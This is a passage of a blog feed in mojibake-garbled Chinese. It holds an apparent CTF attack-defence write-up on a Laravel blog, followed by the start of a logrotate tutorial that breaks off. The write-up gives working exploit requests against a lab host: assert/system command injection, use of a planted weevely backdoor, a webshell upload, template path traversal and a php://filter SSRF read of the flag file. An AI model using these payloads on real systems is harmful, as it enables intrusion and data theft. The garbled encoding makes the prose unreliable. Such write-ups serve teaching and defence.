<p><span class="md-line md-end-block">å¯ä»¥é€šè¿‡grepæˆ–findç­‰å‘½ä»¤æœç´¢ç›¸å…³å…³é”®å­—ï¼ˆå¦‚<span spellcheck="false"><code>include, require</code></span>ï¼‰ç­‰ï¼Œæ¥å¿«é€Ÿå®šä½ç›¸å…³ä½ç½®ï¼Œéšåå¯¹æºç è¿›è¡Œå®¡æŸ¥ã€‚ä½†å› ä¸ºè¿™ç±»å…³é”®è¯å‡ ä¹åœ¨æ‰€æœ‰çš„ä»£ç æ–‡ä»¶ä¸­éƒ½å­˜åœ¨ï¼Œå®¡æŸ¥éš¾åº¦ç›¸å¯¹è¾ƒå¤§ã€‚ä½†ç”±äºä»»æ„æ–‡ä»¶åŒ…å«ä¸€èˆ¬å‡ºç°åœ¨ä¸šåŠ¡é€»è¾‘å†…ï¼Œä¸å¸¸ç”¨åº“çš„åŒ…å«æ–¹å¼æœ‰æ‰€åŒºåˆ«ï¼Œæœ‰èƒ½åŠ›çš„å›¢é˜Ÿå¯ä»¥å¼€å‘ä¸€äº›å®¡è®¡å·¥å…·ï¼Œå¯¹å…¶ç‰¹å¾è¿›è¡Œå®¡è®¡ï¼Œä¹Ÿå¯ä»¥ä»ä¸šåŠ¡é€»è¾‘å…¥æ‰‹å¯¹ç›¸å…³ä»£ç è¿›è¡Œå®¡è®¡ã€‚ç”±äºè¿™ç±»é—®é¢˜ä¼šå½±å“ç¨‹åºè¿è¡Œé€»è¾‘ï¼Œå› æ­¤éœ€è¦é€‰æ‰‹ç†è§£é¢˜æ„ï¼Œæ ¹æ®é¢˜ç›®çš„ä¸šåŠ¡é€»è¾‘ä¿®å¤ä»£ç æˆ–æ·»åŠ é˜²å¾¡æªæ–½ã€‚</span></p>
<p><span class="md-line md-end-block">åœ¨æœ¬é¢˜ä¸­ï¼Œå®¹æ˜“å‘ç°ç³»ç»Ÿè‡ªå¸¦çš„ä¸‰ä¸ªæ¨¡æ¿å‡ä»¥<span spellcheck="false"><code>[0-9]\.tpl</code></span>å‘½åï¼Œå› æ­¤åœ¨ç›¸å…³ä¸šåŠ¡é€»è¾‘ä¸­ï¼Œå¯¹æäº¤çš„æ¨¡æ¿åç§°è¿›è¡Œè¿‡æ»¤å³å¯ã€‚å…·ä½“çš„ä½ç½®å¦‚ä¸‹ã€‚</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function store()
{
    $validator = Validator::make(Input::all(), Post::$rules);
    
    if ($validator-&gt;fails())
    {
        return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
    }
    $data = Input::only('title', 'body', 'category_id', 'template');
    $data['user_id'] = Auth::user()-&gt;id;
    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
    
    $post = Post::create($data);
    $post-&gt;tag(Input::get('tags'));
    
    Flash::success(lang('Operation succeeded.'));
    return Redirect::route('posts.show', $post-&gt;id);
}
# 2. app/controllers/PostsController.php
public function update($id)
{
    $post = Post::findOrFail($id);
    $this-&gt;authorOrAdminPermissioinRequire($post-&gt;user_id);
    $validator = Validator::make($data = Input::all(), Post::$rules);
    if ($validator-&gt;fails())
    {
            return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
    }
    
    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
    
    $post-&gt;update($data);
    $post-&gt;retag(Input::get('tags'));
    
    Flash::success(lang('Operation succeeded.'));
    return Redirect::route('posts.show', $post-&gt;id);
}</pre>
<p><span class="md-line md-end-block">åœ¨è¿™ä¸¤ä¸ªå‡½æ•°ä¸­ï¼Œå¯¹<span spellcheck="false"><code>$data['template']</code></span>æä¾›çš„æ–‡ä»¶åè¿›è¡Œæ­£åˆ™åŒ¹é…è¿‡æ»¤å³å¯ã€‚</span></p>
<h3 class="md-end-block md-heading">ä»»æ„æ–‡ä»¶ä¸Šä¼ </h3>
<p><span class="md-line md-end-block">å¯ä»¥é€šè¿‡grepæˆ–findç­‰å‘½ä»¤æœç´¢ç›¸å…³å…³é”®å­—ï¼ˆå¦‚<span spellcheck="false"><code>upload, $_FILES, move_uploaded_file, move</code></span>ï¼‰ç­‰ï¼Œæ¥å¿«é€Ÿå®šä½ç›¸å…³ä½ç½®ï¼Œéšåå¯¹æºç è¿›è¡Œå®¡æŸ¥ã€‚è¿™ç±»æ¼æ´ä¸€èˆ¬æ¯”è¾ƒå®¹æ˜“è¿›è¡Œå®¡æŸ¥ï¼Œç›¸å…³å…³é”®è¯å³å¯å¤§è‡´å®šä½å¯èƒ½å‡ºç°é—®é¢˜çš„ä½ç½®ã€‚ç”±äºè¿™ç±»å‡½æ•°ç”¨é€”å¾ˆå¤šï¼Œå› æ­¤å®¡è®¡éš¾åº¦ä¹Ÿç›¸å¯¹è¾ƒå¤§ã€‚å»ºè®®ä»ä¸šåŠ¡é€»è¾‘å…¥æ‰‹å¯¹ç›¸å…³ä»£ç è¿›è¡Œå®¡è®¡ã€‚ç”±äºè¿™ç±»é—®é¢˜ä¼šå½±å“ç¨‹åºè¿è¡Œé€»è¾‘ï¼Œå› æ­¤éœ€è¦é€‰æ‰‹ç†è§£é¢˜æ„ï¼Œæ ¹æ®é¢˜ç›®çš„ä¸šåŠ¡é€»è¾‘ä¿®å¤ä»£ç æˆ–æ·»åŠ é˜²å¾¡æªæ–½ã€‚</span></p>
<p><span class="md-line md-end-block">åœ¨æœ¬é¢˜ä¸­ï¼Œå®¹æ˜“å‘ç°åšå®¢æ–‡ç« å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½æœªå¯¹æ–‡ä»¶ç±»å‹è¿›è¡Œè¿‡æ»¤ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç›¸å…³ä»£ç ï¼Œè¿‡æ»¤æ‰å¯èƒ½å¯¼è‡´ä¸Šä¼ æœ¨é©¬æ–‡ä»¶çš„æ‰©å±•åã€‚</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function uploadImage()
{
    $data = [
        'success' =&gt; false,
        'msg' =&gt; 'Failed!',
        'file_path' =&gt; ''
    ];

    if ($file = Input::file('upload_file'))
    {
        $fileName        = $file-&gt;getClientOriginalName();
        $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
        $destinationPath = public_path() . $folderName;
        $safeName        = str_random(10).'.'.$extension;
        $file-&gt;move($destinationPath, $safeName);
        $data['file_path'] = $folderName .'/'. $safeName;
        $data['msg'] = "Succeeded!";
        $data['success'] = true;
    }
    return $data;
}</pre>
<p><span class="md-line md-end-block">è¿™é‡Œå¯ä»¥ç®€å•çš„è¿‡æ»¤<span spellcheck="false"><code>$safeName</code></span>ä¸­æ˜¯å¦åŒ…å«<span spellcheck="false"><code>'php'</code></span>ç­‰å¯ä½œä¸ºè„šæœ¬è¿è¡Œçš„æ–‡ä»¶æ‰©å±•åå­—ç¬¦ä¸²ï¼Œå‘ç°é—®é¢˜ç›´æ¥è¿”å›é”™è¯¯å³å¯ã€‚</span></p>
<h3 class="md-end-block md-heading">æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ </h3>
<p><span class="md-line md-end-block">å¯ä»¥é€šè¿‡grepæˆ–findç­‰å‘½ä»¤æœç´¢ç›¸å…³å…³é”®å­—ï¼ˆå¦‚file_get_content, curlï¼‰ç­‰ï¼Œæ¥å¿«é€Ÿå®šä½ç›¸å…³ä½ç½®ï¼Œéšåå¯¹æºç è¿›è¡Œå®¡æŸ¥ã€‚ä½†ç”±äºè¿™ç±»å‡½æ•°ç”¨é€”å¾ˆå¤šï¼Œå› æ­¤å®¡è®¡éš¾åº¦ä¹Ÿç›¸å¯¹è¾ƒå¤§ã€‚å»ºè®®ä»ä¸šåŠ¡é€»è¾‘å…¥æ‰‹å¯¹ç›¸å…³ä»£ç è¿›è¡Œå®¡è®¡ã€‚ç”±äºè¿™ç±»é—®é¢˜ä¼šå½±å“ç¨‹åºè¿è¡Œé€»è¾‘ï¼Œå› æ­¤éœ€è¦é€‰æ‰‹ç†è§£é¢˜æ„ï¼Œæ ¹æ®é¢˜ç›®çš„ä¸šåŠ¡é€»è¾‘ä¿®å¤ä»£ç æˆ–æ·»åŠ é˜²å¾¡æªæ–½ã€‚</span></p>
<p><span class="md-line md-end-block">åœ¨æœ¬é¢˜ä¸­ï¼Œæ­¤æ¼æ´å¹¶ä¸å­˜åœ¨å‰ç«¯è°ƒç”¨ï¼Œå› æ­¤åªèƒ½å¯¹ä»£ç è¿›è¡Œå®¡è®¡ã€‚å¯ä»¥å‘ç°åœ¨<span spellcheck="false"><code>/resolve_file</code></span>è¯·æ±‚å¯¹åº”çš„å¤„ç†å‡½æ•°ä¸­å­˜åœ¨æ­¤ç±»æƒ…å†µã€‚</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function resolveImage()
{
    $resp = [
        'success' =&gt; false,
        'msg' =&gt; 'Failed!',
        'file_path' =&gt; ''
    ];

    $data = Input::only('resolve_file');

    $content = @file_get_contents($data['resolve_file']);
    if ($content)
    {
        $extension       = 'png';
        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
        $destinationPath = public_path() . $folderName;
        $safeName        = str_random(10).'.'.$extension;
        @mkdir($destinationPath, 0755, true);
        @file_put_contents($destinationPath .'/'. $safeName, $content);
        $resp['file_path'] = $folderName .'/'. $safeName;
        $resp['msg'] = "Succeeded!";
        $resp['success'] = true;
    }
    return $resp;
}</pre>
<p><span class="md-line md-end-block">å¯ä»¥å‘ç°è¿™é‡Œ<span spellcheck="false"><code>file_get_contents</code></span>ç›´æ¥ä¼ å…¥äº†è¯·æ±‚å‚æ•°ï¼Œè€Œæœªå¯¹å…¶åšè¿‡æ»¤ï¼Œå› æ­¤å¯èƒ½å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚è¿™é‡Œå¯ä»¥é€šè¿‡æ£€æŸ¥<span spellcheck="false"><code>$data['resolve_file']</code></span>çš„å¼€å¤´æ˜¯å¦ä¸º<span spellcheck="false"><code>'http'</code></span>å¹¶ä¸”å¯¹<span spellcheck="false"><code>'localhost'</code></span>, <span spellcheck="false"><code>'127.*.*.*'</code></span>ç­‰ç›¸å…³çš„å†…ç½‘åŸŸåã€IPç­‰è¿›è¡Œè¿‡æ»¤ã€‚</span></p>
<h2 class="md-end-block md-heading">0x02 æ¼æ´åˆ©ç”¨æ–¹å¼</h2>
<h3 class="md-end-block md-heading">1. index</h3>
<pre class="lang:default decode:true">GET http://localhost:21000/?method=assert HTTP/1.1
Host: localhost:21000
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Referer: system('cat /home/web/flag/flag')</pre>
<h3 class="md-end-block md-heading">2. 404</h3>
<pre class="lang:default decode:true">POST http://localhost:21000/asdadasdaasd HTTP/1.1
Host: localhost:21000
Content-Length: 27
Content-Type: application/x-www-form-urlencoded

notfound=system("cat%20%2Fhome%2Fweb%2Fflag%2Fflag")</pre>
<p><span class="md-line md-end-block">åœ¨æ¯”èµ›ç°åœºç”±äºéƒ¨ç½²æ—¶ä½¿ç”¨äº†php7, preg_matchçš„ré€‰é¡¹å·²æ— æ³•ä½¿ç”¨ï¼Œå› æ­¤è¯¥æ¼æ´å¤±æ•ˆã€‚</span></p>
<h3 class="md-end-block md-heading">3. upload_image</h3>
<pre class="lang:default decode:true">POST /upload_image</pre>
<p><span class="md-line md-end-block">ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œéšåé€šè¿‡ä¸€å¥è¯æœ¨é©¬åˆ©ç”¨ã€‚</span></p>
<h3 class="md-end-block md-heading">4. weevely in autoload_real.php</h3>
<pre class="lang:default decode:true">$ weevely http://ip:port/any xman1234</pre>
<p><span class="md-line md-end-block">éšåé€šè¿‡weevelyç›´æ¥è¯»flag</span></p>
<h3 class="md-end-block md-heading">5. Post checker=shellcmd in autoload.php</h3>
<pre class="lang:default decode:true">POST http://localhost:21000/ HTTP/1.1
Host: localhost:21000
Content-Length: 41
Content-Type: application/x-www-form-urlencoded

checker=cat%20%2Fhome%2Fweb%2Fflag%2Fflag</pre>
<h3 class="md-end-block md-heading">6. template any file require</h3>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>http://localhost:21000/posts/create</code></span>åœ¨å‘å¸ƒæ–‡ç« æ—¶ä¿®æ”¹æäº¤çš„æ¨¡æ¿å€¼</span></p>
<pre class="lang:default decode:true">html
&lt;div class="form-group"&gt;
    &lt;select class="form-control" name="template"&gt;
    &lt;option value="/../../../../../../home/web/flag/flag"&gt;Template 1&lt;/option&gt;
    &lt;option value="2.tpl"&gt;Template 2&lt;/option&gt;
    &lt;option value="3.tpl"&gt;Template 3&lt;/option&gt;&lt;/select&gt;
&lt;/div&gt;</pre>
<p><span class="md-line md-end-block">éšåæ–°å‘å¸ƒçš„æ–‡ç« ä¸­å°±ä¼šåŒ…å«flagçš„å€¼</span></p>
<h3 class="md-end-block md-heading">7. resolve_file SSRF</h3>
<pre class="lang:default decode:true">POST http://localhost:21000/resolve_image HTTP/1.1
Host: localhost:21000
Content-Length: 112
Content-Type: application/x-www-form-urlencoded
Cookie: laravel_session=eyJpdiI6ImN0alBVaUVmSWhDKzlpVXhybGVPZXc9PSIsInZhbHVlIjoianU3Ym9CcXFOeVN4bW5nS0k2MWxcL25Ed0FBN2s5VFg5SFlxRGl5eW12b1J4bkpSTFl3QzR3d0l4bUtvTzhMNklEQndEdlRDMVF0UmtSTllnVlNOaUR3PT0iLCJtYWMiOiJjNWNiNmMyODNjYmU1MGUyYTE0OWY0ZTMxMGQ4ZTRmM2Q2MDRhMDBjOWJmNTU4MGJjMDY1NGRkNzdjNDJhYjYwIn0%3D

resolve_file=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D../../../../../../home/web/flag/flag</pre>
<p><span class="md-line md-end-block"><span class="">éšåæ ¹æ®è¿”å›çš„jsonæ–‡ä»¶ä¸­file_pathçš„å€¼ä¸‹è½½æ–‡ä»¶åbase64è§£ç å³ä¸ºflag</span></span></p>
<p>&nbsp;</p>
<h2>0x03 æ€»ç»“</h2>
<p>è¿™æ¬¡å‡ºé¢˜éš¾åº¦å±äºè¾ƒä¸ºç®€å•çš„ï¼Œè€ƒå¯Ÿçš„ä¹Ÿæ˜¯æœ€åŸºç¡€çš„ä¸€äº›å¸¸è§webæ³¨å…¥ç‚¹ã€‚ä½†ç”±äºæ—¶é—´å…³ç³»å’Œæ¯”èµ›æ€§è´¨ï¼Œæ²¡æœ‰å¯¹XSSï¼ŒCSRFï¼ŒSQLæ³¨å…¥ç­‰çŸ¥è¯†ç‚¹è¿›è¡Œè€ƒå¯Ÿï¼Œä¸”æ‰€æœ‰çš„æ¼æ´ç‚¹å‡ä¸ºå¯ç›´æ¥åˆ©ç”¨ï¼Œæ²¡æœ‰éœ€è¦äºŒæ¬¡åˆ©ç”¨çš„æ¼æ´ã€‚ä»¥åå¯èƒ½ä¼šå°è¯•å‡ºä¸€äº›å’Œå¯†ç å­¦/misc/pwnç›¸ç»“åˆçš„webæ”»é˜²é¢˜ã€‚æœ€åä¹Ÿæ­å–œåœ¨è¿™æ¬¡å¤ä»¤è¥ä¸­å–å¾—ä¼˜å¼‚æˆç»©çš„å„ä½å¤§å¸ˆå‚…ï¼</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/logrotate.html</id>
        <title><![CDATA[Logrotate æ—¥å¿—æ»šåŠ¨ è§£å†³æ—¥å¿—å ç”¨ç©ºé—´è¿‡å¤§]]></title>
        <updated>2017-05-03T16:23:04+08:00</updated>
        <link href="https://www.noisyfox.io/logrotate.html"/>
        <content type="text/html" src="https://www.noisyfox.io/logrotate.html"><![CDATA[<h1>èµ·å› </h1>
<p>å‰å‡ å¤©å‘ç°è‡ªå·±çš„åšå®¢æ²¡æœ‰åŠæ³•ç™»å½•äº†ï¼Œæ¯æ¬¡è¾“å®Œå¯†ç ç™»å½•å®Œéƒ½ä¼šé‡æ–°è·³å›ç™»å½•ç•Œé¢ã€‚ä¸€å¼€å§‹æ˜¯æ€€ç–‘ç™»å½•çš„sessionå‡ºäº†ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºæµè§ˆå™¨å¼€éšèº«æ¨¡å¼åå°±èƒ½ç™»å½•è¿›å»ã€‚ç„¶è€Œå¼€éšèº«æ¨¡å¼è¿›åå°çš„æ—¶å€™åˆä¼šå‡ºç°403é”™è¯¯ï¼Œäºæ˜¯æ‰“ç®—è¿è¿›æ•°æ®åº“æŠŠsessionåˆ é™¤å†è¯•è¯•ã€‚</p>
<p>ç„¶è€Œå½“æˆ‘è¯•å›¾è¿æ¥æ•°æ®åº“æ—¶å´ä¸€ç›´æç¤ºå¤±è´¥ï¼Œäºæ˜¯è¯•å›¾é‡å¯æ•°æ®åº“æœåŠ¡ï¼Œä½†æ˜¯ç³»ç»Ÿæç¤ºå¯åŠ¨å¤±è´¥ã€‚ç”µè„‘åäº†æ€ä¹ˆåŠï¼Ÿé‡å¯å¤§æ³•ï¼ç„¶è€Œæ•°æ®åº“æœåŠ¡ä¾æ—§æ— æ³•å¯åŠ¨ï¼Œå½“æ—¶æˆ‘ä¹Ÿæ˜¯æ‘¸ä¸ç€å¤´è„‘ã€‚æ˜æ˜ä»¥å‰ä¸€ç›´å¥½å¥½çš„æœåŠ¡å™¨æ€ä¹ˆè¯´ç‚¸å°±ç‚¸å‘¢ï¼Ÿ</p>
<h1>çœŸç›¸</h1>
<p>åæ¥æˆ‘æœºæ™ºçš„çœ‹äº†ä¸‹ç£ç›˜çš„å ç”¨æƒ…å†µï¼š</p>
<pre class="brush: bash; title: ; notranslate">df -hl</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png"><img class="aligncenter size-full wp-image-483" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png" alt="df -hl" width="543" height="152" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl.png 543w, https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl-300x84.png 300w" sizes="(max-width: 543px) 100vw, 543px" /></a></p>
<p>ç„¶åæˆ‘å°±éœ‡æƒŠäº†ï¼ï¼<span style="color: #000000;"><del>éœ‡æƒŠï¼è¿‡æ°”åšä¸»ç¡¬ç›˜ä¸ºä½•è¢«æ¦¨å¹²ï¼è¿™èƒŒåç©¶ç«Ÿæ˜¯äººæ€§çš„&#8230;ï¼ˆå•ª</del></span></p>
<p>ç»è¿‡ä¸€ç•ªæŠ˜è…¾ï¼Œç»ˆäºæ‰¾åˆ°äº†é—®é¢˜çš„æ‰€åœ¨ï¼š</p>
<pre class="brush: bash; title: ; notranslate">du -sh .</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png"><img class="aligncenter size-full wp-image-484" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png" alt="df -hl" width="481" height="96" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh.png 481w, https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh-300x60.png 300w" sizes="(max-width: 481px) 100vw, 481px" /></a></p>
<p>Nginx çš„æ—¥å¿—æ–‡ä»¶å±…ç„¶å ç”¨äº†14Gçš„ç©ºé—´ï¼Whyï¼Ÿ</p>
<h1>è®ºæ—¥å¿—</h1>
<p>æ—¥å¿—æ–‡ä»¶é€šå¸¸æƒ…å†µä¸‹æ˜¯æœªå‹ç¼©çš„æ˜æ–‡æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨ä¸€ä¸ªè¿è¡Œæ—¶é—´è¾ƒé•¿çš„ç³»ç»Ÿä¸­æ—¥å¿—æ–‡ä»¶çš„ä½“ç§¯ä¼šè¶Šæ¥è¶Šå¤§ï¼Œç”šè‡³è¿œè¶…ä½ çš„é¢„æœŸã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ä¸€ä¸ªæœåŠ¡çš„åŒä¸€ä¸ªæ—¥å¿—æµï¼ˆå¦‚ Nginx é»˜è®¤å°±æœ‰ error.log access.log ä¸¤ä¸ªæ—¥å¿—æµï¼‰æ˜¯è¾“å‡ºåˆ°åŒä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­çš„ï¼Œä¹Ÿå°±æ˜¯è¯´éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè¿™ä¸€æ—¥å¿—æ–‡ä»¶ä¸­åŒ…å«çš„æ—¥å¿—çš„å¤©æ•°ä¹Ÿä¼šè¶Šæ¥è¶Šå¤šï¼Œè¿™å°±ç»™æŸ¥çœ‹æŸä¸€ç‰¹å®šæ—¶é—´æ®µçš„æ—¥å¿—å¸¦æ¥äº†éº»çƒ¦ï¼ˆè¯•æƒ³ä¸€ä¸‹åœ¨ä¸€ä¸ªå®¹é‡10Gï¼ŒåŒ…å«äº†ä¸€æ•´å¹´æ•°æ®çš„æ—¥å¿—æ–‡ä»¶ä¸­æŸ¥æ‰¾5æœˆä»½çš„æ—¥å¿—ä¿¡æ¯ï¼Œè€Œä¸”è¿˜æ²¡æœ‰æ—¥å¿—è¾…åŠ©å·¥å…·çš„å¸®åŠ©ï¼Œæ˜¯ä¸€ä»¶å¤šä¹ˆç—›è‹¦çš„äº‹æƒ…ï¼‰ã€‚å¹¶ä¸”å¦‚æœæ—¥å¿—æ–‡ä»¶å ç”¨äº†è¿‡å¤§çš„å­˜å‚¨ç©ºé—´ï¼Œé‚£ä¹ˆäººä»¬é€šå¸¸ä¼šä¼˜å…ˆåˆ é™¤æœ€è€çš„æ—¥å¿—ï¼Œä¿ç•™æœ€è¿‘ä¸€æ®µæ—¶é—´çš„æ—¥å¿—ã€‚å¦‚æœæ‰€æœ‰æ—¥å¿—ä¿¡æ¯éƒ½å‚¨å­˜åœ¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆæƒ³è¦åªåˆ é™¤éƒ¨åˆ†æ•°æ®ä¹Ÿä¸æ˜¯ä¸€ä»¶è½»æ¾çš„æ´»ã€‚</p>
<p>å†è€…ï¼Œæ—¥å¿—æ•°æ®é€šå¸¸éƒ½æ˜¯çº¯æ–‡æœ¬æ•°æ®ï¼Œå¹¶ä¸”å†…å®¹é‡å¤åº¦éå¸¸ä¹‹é«˜ï¼Œå¦‚æœèƒ½å¤Ÿå°†å…¶å‹ç¼©å­˜å‚¨ï¼Œé‚£ä¹ˆä¼šå¤§å¤§å‡å°ä½“ç§¯ã€‚ç„¶è€Œæ—¥å¿—ç³»ç»Ÿæ˜¯æ²¡æœ‰åŠæ³•å°†æ•°æ®è¿½åŠ åˆ°ä¸€ä¸ªå‹ç¼©è¿‡çš„æ—¥å¿—æ–‡ä»¶ä¸­å»çš„ã€‚å¦‚æœè¦å‹ç¼©æ—¥å¿—ï¼Œé‚£ä¹ˆåŠ¿å¿…éœ€è¦å°†æ—¥å¿—æ•°æ®åˆ’åˆ†æˆæ–°ã€æ—§ä¸¤éƒ¨åˆ†ï¼Œå…¶ä¸­æ—§æ—¥å¿—å‹ç¼©åå•ç‹¬å­˜æ”¾ï¼Œæ–°æ—¥å¿—å³æ˜¯å½“å‰ç³»ç»Ÿæ´»åŠ¨çš„æ—¥å¿—æ–‡ä»¶ï¼Œä»ç„¶æ˜¯çº¯æ–‡æœ¬å½¢å¼ã€‚</p>
<p>ç»¼ä¸Šæ‰€è¿°ï¼Œä¸€ä¸ªå¥½çš„æ—¥å¿—ç³»ç»Ÿè‡³å°‘éœ€è¦æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªéœ€æ±‚ï¼š</p>
<ul>
<li>èƒ½å¤Ÿå°†æ—¥å¿—æŒ‰ä¸€å®šè§„å¾‹æ‹†åˆ†æˆå¤šä¸ªæ–‡ä»¶</li>
<li>èƒ½å¤Ÿå°†éæ´»åŠ¨çš„æ—¥å¿—å‹ç¼©</li>
<li>èƒ½å¤Ÿæ§åˆ¶æ—¥å¿—æ–‡ä»¶ä½“ç§¯å’Œæ•°é‡ï¼Œå½“æ¡ä»¶æ»¡è¶³æ—¶è‡ªåŠ¨åˆ é™¤æ—§æ—¥å¿—ä»¥é‡Šæ”¾ç©ºé—´</li>
<li>æ—¥å¿—æ–‡ä»¶åæ»¡è¶³ä¸€å®šè§„å¾‹ä¾¿äºæ’åºå’Œç­›é€‰</li>
</ul>
<p>ä»¥ä¸Šçš„éœ€æ±‚ï¼Œé€šå¸¸ç§°ä¸º<strong>æ—¥å¿—æ»šåŠ¨</strong><del>ï¼ˆå¿…è€ƒï¼‰</del>ã€‚</p>
<h1>æ—¥å¿—æ»šåŠ¨</h1>
<p>é“ç†æˆ‘éƒ½æ‡‚ï¼Œä½†æ˜¯Linuxçš„æ—¥å¿—ç³»ç»Ÿæ²¡æœ‰æä¾›è¿™äº›åŠŸèƒ½ï¼Œæ€»ä¸èƒ½æ¯å¤©æ‰‹åŠ¨é‡å‘½åã€å‹ç¼©ã€æ¸…ç©ºã€åˆ é™¤æ—¥å¿—å§ï¼Ÿ</p>
<p><del>å¤©ç©ºä¸€å£°å·¨å“ï¼Œè‹±é›„é—ªäº®ç™»åœºï¼</del>è¿™æ—¶å€™ä¸€ä¸ªå«åš <strong>logrotate</strong> çš„ç¨‹åºå°±æ´¾ä¸Šäº†ç”¨å¤„ã€‚</p>
<p>æ ¹æ®ä½¿ç”¨çš„ç³»ç»Ÿä¸åŒï¼Œlogrotateçš„å®‰è£…æ–¹å¼ä¹Ÿä¸å°½ç›¸åŒï¼Œæœ‰äº›ç³»ç»Ÿæ›´æ˜¯è‡ªå¸¦äº† logrotate å¹¶ä¸”å¸¦æœ‰å¾ˆå¤šé»˜è®¤çš„é…ç½®ï¼ˆæ¯”å¦‚æˆ‘æ‰€ä½¿ç”¨çš„ Ubuntu Serverï¼‰ã€‚</p>
<p>ä½ å¯ä»¥åœ¨è‡ªå·±çš„ç³»ç»Ÿä¸ŠæŸ¥çœ‹ä¸€ä¸‹ /var/log/ ç›®å½•ä¸‹çš„æ—¥å¿—æ–‡ä»¶ï¼Œå¦‚æœè§åˆ°äº†ç±»ä¼¼â€œæœåŠ¡å.log.0â€ã€â€œæœåŠ¡å.log.1â€ç­‰ä¸€å¤§å †å…·æœ‰ç›¸åŒæœåŠ¡åç§°ä½†æ˜¯å¸¦æœ‰åç¼€åºå·çš„æ—¥å¿—æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥99%è‚¯å®šè¿™ä¸ªç³»ç»Ÿå·²ç»å®‰è£…äº† logrotate å¹¶ä¸”èƒ½å¤Ÿå·¥ä½œã€‚</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png"><img class="aligncenter size-full wp-image-492" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png" alt="logrotate" width="663" height="579" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logs.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logs-300x262.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>å¦‚æœä½ çš„ç³»ç»Ÿæ²¡æœ‰å¸¦logrotateï¼Œåˆ«æ‹…å¿ƒï¼Œç™¾åº¦ä¸€ä¸‹å°±èƒ½è£…ä¸Šå•¦ï¼è€Œä¸”é…ç½®å·¨ç®€å•ï¼</p>
<p>åœ¨ /etc/logrotate.d/ ç›®å½•ä¸‹ï¼ˆä¸åŒç³»ç»Ÿå¯èƒ½æœ‰æ‰€åŒºåˆ«ï¼‰é€šå¸¸ä¼šæœ‰å¾ˆå¤šé…ç½®æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶çš„åå­—é€šå¸¸å¯¹åº”äº†è¯¥æ–‡ä»¶æ‰€ç®¡è¾–çš„æœåŠ¡ï¼ˆæ–‡ä»¶åä»…ä»…æ˜¯ä¾¿äºç®¡ç†ï¼Œå’Œå®é™…å†…å®¹æ²¡æœ‰å¿…ç„¶å…³è”ï¼‰ã€‚</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png"><img class="aligncenter size-full wp-image-494" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png" alt="logrotate config" width="663" height="435" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg-300x197.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>è€Œè¿™äº›é…ç½®æ–‡ä»¶çš„æ ¼å¼éå¸¸çš„ç®€è¦ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚é€šå¸¸ç¬¬ä¸€è¡Œä»¥ç›®æ ‡æ—¥å¿—æ–‡ä»¶è·¯å¾„èµ·å¤´ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ï¼Œè€Œåé¢çš„èŠ±æ‹¬å·å†…éƒ¨åˆ™æ˜¯éœ€è¦åº”ç”¨äºè¯¥æ—¥å¿—æ–‡ä»¶çš„æ»šåŠ¨è§„åˆ™ã€‚</p>
<p>å…¶ä¸­å‡ ä¸ªå¸¸ç”¨çš„è§„åˆ™åœ¨è¿™é‡Œç¨å¾®è§£é‡Šä¸€ä¸‹ï¼Œé€šå¸¸å°±å¤Ÿç”¨äº†ã€‚æ›´è¯¦ç»†çš„è§„åˆ™å¯ä»¥è‡ªè¡ŒæŸ¥æ‰¾ï¼Œä¸å†èµ˜è¿°ã€‚</p>
<pre class="brush: bash; title: ; notranslate">

/var/log/nginx/*.log {
